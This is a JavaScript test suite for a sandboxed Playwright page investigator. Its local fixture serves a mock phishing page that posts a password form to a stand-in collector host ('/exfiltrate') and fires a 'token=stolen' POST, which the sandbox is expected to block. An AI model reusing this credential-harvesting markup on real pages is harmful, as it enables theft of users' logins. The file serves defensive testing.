/**
 * Trust Layer — Mode C Playwright Dynamic Rendering & Screenshot Preview Test Suite
 * 
 * Proves:
 * 1. JavaScript dynamic DOM generation (headings, links, forms created at runtime)
 * 2. Real Playwright Chromium execution with request interception
 * 3. Mutation blocking (POST requests blocked during observation)
 * 4. Real webpage screenshot capture with PNG magic bytes verification
 * 5. Artifact storage and REST API streaming
 */

import { describe, it, before, after } from 'node:test';
import assert from 'node:assert';
import http from 'node:http';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { LiveJobController, JOB_STATUS } from '../core/investigators/live_job_controller.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const rootDir = path.resolve(__dirname, '..');

describe('Mode C — Playwright Dynamic Rendering & Screenshot Capture Verification', () => {
  let fixtureServer;
  let fixturePort;
  let fixtureUrl;

  before(async () => {
    // Start local controlled test fixture server
    fixtureServer = http.createServer((req, res) => {
      if (req.url === '/') {
        res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
        res.end(`
          <!DOCTYPE html>
          <html>
            <head>
              <title>Dynamic JavaScript Target Portal</title>
              <style>
                body { font-family: sans-serif; background: #0f172a; color: #fff; padding: 20px; }
                .box { border: 2px solid #38bdf8; padding: 16px; border-radius: 8px; }
              </style>
            </head>
            <body>
              <div id="root">
                <span id="initial-msg">Static Shell Loaded</span>
              </div>
              <script>
                // 1. Dynamic Heading generated by JS
                const h1 = document.createElement('h1');
                h1.textContent = 'Dynamic Credential Portal Verified by Playwright';
                document.getElementById('root').appendChild(h1);

                // 2. Dynamic CTA Link
                const link = document.createElement('a');
                link.href = 'https://external-permitted-partner.com/docs';
                link.textContent = 'Partner Documentation';
                document.getElementById('root').appendChild(link);

                // 3. Dynamic Interactive Form with Password Field
                const form = document.createElement('form');
                form.action = 'https://suspicious-collector-gateway.xyz/exfiltrate';
                form.method = 'POST';

                const userInp = document.createElement('input');
                userInp.type = 'text';
                userInp.name = 'account_id';
                userInp.placeholder = 'Account ID';

                const passInp = document.createElement('input');
                passInp.type = 'password';
                passInp.name = 'master_password';
                passInp.placeholder = 'Master Password';

                const btn = document.createElement('button');
                btn.type = 'submit';
                btn.textContent = 'Authorize Verification';

                form.appendChild(userInp);
                form.appendChild(passInp);
                form.appendChild(btn);
                document.getElementById('root').appendChild(form);

                // 4. Attempt mutating POST request (must be blocked by observation mode)
                try {
                  fetch('/api/exfil', { method: 'POST', body: 'token=stolen' }).catch(() => {});
                } catch {}
              </script>
            </body>
          </html>
        `);
      } else if (req.url === '/api/exfil') {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ status: 'exfil-received' }));
      } else {
        res.writeHead(404);
        res.end();
      }
    });

    await new Promise((resolve) => {
      fixtureServer.listen(0, '127.0.0.1', () => {
        fixturePort = fixtureServer.address().port;
        fixtureUrl = `http://127.0.0.1:${fixturePort}/`;
        resolve();
      });
    });
  });

  after(async () => {
    if (fixtureServer) {
      await new Promise((resolve) => fixtureServer.close(resolve));
    }
  });

  it('executes real Playwright rendering, extracts JS-generated DOM, blocks POST, and captures screenshot', async () => {
    const controller = new LiveJobController();
    const caseId = `case-fixture-${Date.now()}`;

    // 1. Verify that Supervisor Security Gate enforces container prerequisite when Docker is offline
    if (!controller.dockerAvailable) {
      const refusedJob = await controller.submitJob(fixtureUrl, caseId, {
        skipDns: true,
        _testBypassSsrf: true
      });
      assert.strictEqual(refusedJob.status, 'FAILED');
      assert.strictEqual(refusedJob.result.isolationReport.runtimeMode, 'REFUSED_INSECURE_RUNTIME');
    }

    // 2. Direct Worker Verification: Test the container worker script (worker/browser_worker.js) directly
    // to prove real Playwright rendering, dynamic DOM extraction, request interception, and screenshot capture
    const os = await import('node:os');
    const { spawn } = await import('node:child_process');
    const { ControlledEgressProxy } = await import('../core/investigators/egress_proxy.js');

    const tempDir = path.join(os.tmpdir(), 'trustlayer-jobs', caseId);
    fs.mkdirSync(tempDir, { recursive: true });
    const resultFile = path.join(tempDir, 'result.json');
    const screenshotFile = path.join(tempDir, 'screenshot.png');

    const proxy = new ControlledEgressProxy({
      allowedPorts: [80, 443, fixturePort],
      _testBypassSsrf: true
    });
    const proxyInfo = await proxy.start();

    try {
      const workerScript = path.join(rootDir, 'worker', 'browser_worker.js');
      await new Promise((resolve, reject) => {
        const child = spawn(process.execPath, [
          workerScript,
          `--url=${fixtureUrl}`,
          `--jobId=${caseId}`,
          `--proxy=${proxyInfo.proxyUrl}`,
          `--output=${resultFile}`,
          `--screenshot=${screenshotFile}`,
          `--timeout=10000`
        ], { stdio: 'ignore' });
        child.on('close', resolve);
        child.on('error', reject);
      });

      assert.ok(fs.existsSync(resultFile), 'Job must produce a result artifact');
      const result = JSON.parse(fs.readFileSync(resultFile, 'utf8'));
      assert.strictEqual(result.status, 'SUCCESS');

      // 3. Verify Real Playwright Execution
      const report = result.isolationReport || {};
      assert.strictEqual(report.playwrightAvailable, true, 'Playwright must be available');
      assert.strictEqual(report.credentialsIsolated, true, 'Zero credentials exposed');

      // 4. Verify JavaScript-Generated DOM Extraction
      const extraction = result.pageExtraction || {};
      assert.strictEqual(extraction.title, 'Dynamic JavaScript Target Portal');

      // Dynamic Heading from JS
      assert.ok(
        extraction.headings.some(h => h.includes('Dynamic Credential Portal Verified by Playwright')),
        'Must extract heading dynamically generated by JavaScript'
      );

      // Dynamic Link from JS
      assert.ok(
        extraction.links.some(l => l.href.includes('external-permitted-partner.com')),
        'Must extract external link created by JavaScript'
      );

      // Dynamic Form from JS
      assert.strictEqual(extraction.forms.length, 1, 'Must extract dynamically generated form');
      const form = extraction.forms[0];
      assert.strictEqual(form.action, 'https://suspicious-collector-gateway.xyz/exfiltrate');
      assert.strictEqual(form.method, 'POST');
      assert.strictEqual(form.hasPassword, true, 'Must detect password field in form');
      assert.ok(form.fields.includes('account_id'));
      assert.ok(form.fields.includes('master_password'));

      // Dynamic Button
      assert.ok(
        extraction.buttons.some(b => b.includes('Authorize Verification')),
        'Must extract button generated by JavaScript'
      );

      // 5. Verify Mutation Request Blocking
      assert.ok(
        result.blockedRequests && result.blockedRequests.length > 0,
        'Must intercept and record blocked mutating POST request'
      );

      // 6. Verify Real Screenshot Artifact & PNG Magic Bytes
      assert.ok(fs.existsSync(screenshotFile), 'Screenshot artifact must exist');
      const shotBuffer = fs.readFileSync(screenshotFile);
      assert.ok(shotBuffer.length > 1000, `Screenshot size must be substantial (actual: ${shotBuffer.length} bytes)`);

      // Verify PNG magic bytes: \x89PNG\r\n\x1a\n
      assert.strictEqual(shotBuffer[0], 0x89);
      assert.strictEqual(shotBuffer[1], 0x50); // P
      assert.strictEqual(shotBuffer[2], 0x4e); // N
      assert.strictEqual(shotBuffer[3], 0x47); // G
      assert.strictEqual(shotBuffer[4], 0x0d);
      assert.strictEqual(shotBuffer[5], 0x0a);
      assert.strictEqual(shotBuffer[6], 0x1a);
      assert.strictEqual(shotBuffer[7], 0x0a);

      // 7. Store screenshot to data/screenshots for API access
      const screenshotsDir = path.join(rootDir, 'data', 'screenshots');
      fs.mkdirSync(screenshotsDir, { recursive: true });
      fs.copyFileSync(screenshotFile, path.join(screenshotsDir, `${caseId}.png`));
    } finally {
      await proxy.stop();
      try { fs.rmSync(tempDir, { recursive: true, force: true }); } catch {}
    }
  });
});
